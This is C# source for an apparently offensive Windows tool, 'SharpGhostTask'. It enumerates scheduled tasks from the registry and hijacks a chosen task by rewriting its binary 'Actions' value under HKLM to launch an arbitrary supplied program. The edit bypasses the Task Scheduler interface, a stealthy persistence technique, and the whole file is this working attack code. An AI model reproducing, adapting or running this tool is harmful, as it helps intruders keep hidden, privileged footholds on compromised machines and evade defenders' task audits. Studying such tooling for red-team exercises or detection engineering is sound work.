using Microsoft.Win32;
using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace SharpGhostTask
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: SharpGhostTask.exe --showtasks OR SharpGhostTask.exe --targettask [TargetTaskName] --targetbinary [Binary to point to] --help [To show this help menu]");
                return;
            }

            string targetTask = null;
            string targetBinary = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].ToLower() == "--showtasks")
                {
                    ShowTasks();
                    return;
                }
                else if (args[i].ToLower() == "--help")
                {
                    Help();
                    return;
                }
                else if (args[i].ToLower() == "--targetbinary" && i + 1 < args.Length)
                {
                    targetBinary = args[i + 1];
                    i++;
                }
                else if (args[i].ToLower() == "--targettask" && i + 1 < args.Length)
                {
                    targetTask = args[i + 1];
                    i++;
                }
            }

            if (!string.IsNullOrEmpty(targetTask))
            {
                // Handle the case when --targettask is specified
                GhostTask(targetTask, targetBinary);
            }
            else
            {

            }

            void GhostTask(string Task, string targetB)
            {
                // Ghost Scheduled Tasks
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(@"
 .-.
(o o) boo!
| O \
 \   \
  `~~~'
");
                string targetPath = $"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\{Task}";

                Console.WriteLine($"Ghosting Task {Task}");

                string idValue = GetIdValue(targetPath);

                // Start Ghosting

                // Specify the registry path
                string registryKeyPath = $"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{idValue}";

                // Specify the name of the registry entry
                string valueName = "Actions";

                //Display
                //DisplayKeyValues(registryKeyPath);

                // Specify the string value
                string stringValue = targetBinary;

                // Count how many characters
                int characterCount = stringValue.Length * 2;

                // Filler Decimal Values
                byte[] magicBytes1 = { 3, 0, 12, 0, 0, 0, 65, 0, 117, 0, 116, 0, 104, 0, 111, 0, 114, 0, 102, 102, 0, 0, 0, 0, 0, 0, 0, 0 };

                // Find and replace the value of the 24 decimal location with a new value
                byte[] characterCountBytes = BitConverter.GetBytes(characterCount);
                Array.Copy(characterCountBytes, 0, magicBytes1, 24, characterCountBytes.Length);

                // Empty Values
                byte[] magicBytes2 = new byte[10];

                // Convert the string to a byte array
                byte[] binaryDataFromString = System.Text.Encoding.Unicode.GetBytes(stringValue);

                // Concatenate the filler and binary data arrays
                byte[] combinedBinaryData = magicBytes1.Concat(binaryDataFromString).Concat(magicBytes2).ToArray();

                int totalSteps = 10;

                for (int i = 0; i <= totalSteps; i++)
                {
                    UpdateProgressBar(i, totalSteps);
                    // Fake progress for niceness
                    Thread.Sleep(500);
                }
                Console.WriteLine("");
                // Create the registry entry with REG_BINARY value
                SetRegistryValue(registryKeyPath, valueName, combinedBinaryData);
                Console.WriteLine("Ghosted!!!");

                Console.ForegroundColor = ConsoleColor.Gray;
            }

            void UpdateProgressBar(int currentStep, int totalSteps)
            {
                Console.Write("\r[");
                int progress = currentStep * 100 / totalSteps;

                for (int j = 0; j < 50; j++)
                {
                    if (j < progress / 2)
                        Console.Write("#");
                    else
                        Console.Write(" ");
                }

                Console.Write($"] {progress}%");
            }

            void SetRegistryValue(string keyPath, string valueName, byte[] valueData)
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true))
                    {
                        if (key != null)
                        {
                            // Set the registry value for the "Actions" key
                            key.SetValue(valueName, valueData, RegistryValueKind.Binary);
                            //Console.WriteLine($"Registry value '{valueName}' set successfully.");
                        }
                        else
                        {
                            Console.WriteLine($"Registry key '{keyPath}' not found.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
            }

            string GetIdValue(string registryPath)
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath);

                if (key != null)
                {
                    // Retrieve the value of the "Id" key
                    return key.GetValue("Id")?.ToString();
                }
                else
                {
                    Console.WriteLine($"Registry path '{registryPath}' not found.");
                    return null;
                }
            }

            //Find Tasks
            void ShowTasks()
            {
                RegistryKey tasksKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree");

                if (tasksKey != null)
                {
                    string[] taskNames = tasksKey.GetSubKeyNames();

                    if (taskNames.Length > 0)
                    {
                        Console.WriteLine("Available Tasks:");
                        foreach (var taskName in taskNames)
                        {
                            Console.WriteLine(taskName);
                        }
                    }
                    else
                    {
                        Console.WriteLine("No tasks found.");
                    }
                }
            }

            void Help()
            {
                Console.WriteLine("Usage: SharpGhostTask.exe --showtasks OR SharpGhostTask.exe --targettask [TargetTaskName] --targetbinary [Binary to point to] --help [To show this help menu]");
                return;
            }
        }
    }
}
